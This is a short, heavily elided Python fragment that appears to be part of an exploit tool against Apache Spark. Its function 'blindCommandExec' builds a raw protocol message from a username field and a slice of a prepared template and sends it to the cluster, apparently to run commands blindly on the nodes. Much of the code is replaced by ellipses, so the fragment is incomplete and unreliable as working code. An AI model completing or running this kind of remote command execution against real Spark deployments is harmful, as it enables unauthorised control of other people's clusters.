...
def parseCommandOutput(sparkClient, interpreterArgs, numWorkers):
    maxNodes = int(sparkClient.listNodes().size()) - 1
...
def blindCommandExec(sparkClient, binPath, cmdFormatted):
    ...
    payload = (
        ...
        + "t"
        + usernameSize
        + sparkClient.username
        + holder[1747:]
    )
    ret = sparkClient.sendRawMessage(payload)
    if ret:
